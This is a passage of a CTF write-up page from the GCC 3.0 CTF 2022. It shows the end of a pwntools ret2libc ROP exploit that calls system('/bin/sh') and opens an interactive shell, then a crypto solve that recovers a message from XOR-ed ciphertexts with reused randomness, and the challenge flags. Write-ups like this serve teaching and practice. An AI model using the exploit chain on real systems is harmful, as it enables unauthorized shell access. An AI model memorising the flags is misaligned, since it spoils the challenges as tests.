+</span></span><span style="display:flex;"><span>bin_sh_string_addr <span style="color:#555">=</span> <span style="color:#366">next</span>(libc<span style="color:#555">.</span>search(<span style="color:#c30">b</span><span style="color:#c30">&#39;/bin/sh&#39;</span>))
+</span></span><span style="display:flex;"><span>payload_3 <span style="color:#555">=</span> p64(<span style="color:#f60">0</span>) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>payload_3 <span style="color:#555">+=</span> p64(pop_rdi) <span style="color:#555">+</span> p64(bin_sh_string_addr)
+</span></span><span style="display:flex;"><span>payload_3 <span style="color:#555">+=</span> p64(ret_address) <span style="color:#09f;font-style:italic"># https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call</span>
+</span></span><span style="display:flex;"><span>payload_3 <span style="color:#555">+=</span> p64(libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;system&#39;</span>]) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic"># Call system</span>
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(payload_3)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#39;Call system(&#34;/bin/sh&#34;)...&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><p class="markdown-image">
+  <img src="https://i.imgur.com/aUb2CRl.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: HL{PPPwned-7165-4679-8c39-cf7633bdf81b}</p>
+</blockquote>
+<h2 id="idbased1">IDBased1 <a href="#idbased1" class="anchor">#</a></h2>
+<p>After checking with the given ciphertexts consist of encrypted message of &lsquo;This is the test message number x&rsquo;, there is a collision between the ciphertexts CEO and the test ciphertexts</p>
+<p>CEO ciphertexts:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>(48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>One of the test ciphertexts:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>(48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>BasicIdent ciphertext is like below:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>v = m xor H2(gID**r)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Because the $rP$ value is the same, we could know that the $H2(g_{ID}^r)$ value of the ceo and the test cipher texts have the same value, which mean</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ceo_v = b64decode(&#39;4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v&#39;)
+</span></span><span style="display:flex;"><span>test_v = b64decode(&#39;7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc&#39;)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ceo_msg = test_v^b&#39;This is the message number&#39;^ceo_v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Full Script:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">base64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ceo_v <span style="color:#555">=</span> base64<span style="color:#555">.</span>b64decode(<span style="color:#c30">&#39;4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v&#39;</span>)
+</span></span><span style="display:flex;"><span>flag_len <span style="color:#555">=</span> <span style="color:#366">len</span>(ceo_v)
+</span></span><span style="display:flex;"><span>test_v <span style="color:#555">=</span> base64<span style="color:#555">.</span>b64decode(<span style="color:#c30">&#39;7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc&#39;</span>)
+</span></span><span style="display:flex;"><span>test_msg <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;This is the test message number&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> xor(xor(test_v[:flag_len], test_msg[:flag_len]), ceo_v)
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>flag<span style="color:#555">.</span>decode()<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We successfully retrieve the flag</p>
+<blockquote>
+<p>Flag: YNOT18{B4DB4DB4DR4NDOMNE55}</p>
+</blockquote>
+
+      </div>
+      
+        
+  <aside class="toc-container">
+    <a href="#" style="font-weight: 700; color: black;">GCC 3.0 CTF 2022</a>
+    <div class="js-toc">
+      <details>
+          <summary>Table of Contents
+          </summary>
+          <div>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#regexp-challenge">Regexp Challenge</a></li>
+    <li><a href="#license-key-level-1">License Key Level 1</a></li>
+    <li><a href="#license-key-level-2">License Key Level 2</a></li>
+    <li><a href="#license-key-level-3">License Key Level 3</a></li>
+    <li><a href="#license-key-level-4">License Key Level 4</a></li>
+    <li><a href="#plupload">PLUpload</a></li>
+    <li><a href="#ctf-spray-attack-ssh">CTF Spray Attack SSH</a></li>
+    <li><a href="#ctf-spray-attack-http">CTF Spray Attack HTTP</a></li>
+    <li><a href="#crack-me-android">Crack me Android</a></li>
+    <li><a href="#crysys">CrySYS</a></li>
+    <li><a href="#idbased1">IDBased1</a></li>
+  </ul>
+</nav>
+          </div>
+      </details>
+    </div>
+  </aside>
+
+
+      
+    </div>
+
+    
+        <div class="tags">
+            
+                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
+            
+                <a href="https://chovid99.github.io/tags/gcc-ctf">GCC CTF</a>
+            
+                <a href="https://chovid99.github.io/tags/jsp">jsp</a>
+            
+                <a href="https://chovid99.github.io/tags/web">web</a>
+            
+                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
+            
+                <a href="https://chovid99.github.io/tags/android">android</a>
+            
+                <a href="https://chovid99.github.io/tags/short-pwn">short-pwn</a>
+            
+                <a href="https://chovid99.github.io/tags/rop">rop</a>
+            
+                <a href="https://chovid99.github.io/tags/got-overwrite">got overwrite</a>
+            
+                <a href="https://chovid99.github.io/tags/2022">2022</a>
+            
+        </div>
+    
+    
+    
+  <div id="comment">
+    
+    
+  </div>
+
+
+</section>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="/js/tocbot.min.js"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+      
+      tocSelector: '.js-toc',
+      
+      contentSelector: '.js-toc-content',
+      headingSelector: 'h1, h2, h3',
+      orderedList: false,
+      headingLabelCallback: s => s.substr(0, s.length-2),
+      collapseDepth: 2
+  });
+  function initTOC() {
+    var windowWidth = 1316;
+    var $block_2 = $(".toc-container");
+    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
+    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
+  }
+  window.onload = initTOC;
+
+  var lastWindowWidth = $(window).width();
+  $(window).resize(function() {
+    var $block_2 = $(".toc-container");
+    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
+    console.log("hehe", (lastLeft/lastWindowWidth)*$(window).width() + "vw")
+    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
+    lastWindowWidth = $(window).width();
+  });
+</script>
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2022 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Chovid99
+    
+    </div>
+
+    
+</footer>
+
+
+
+  </body>
+</html>
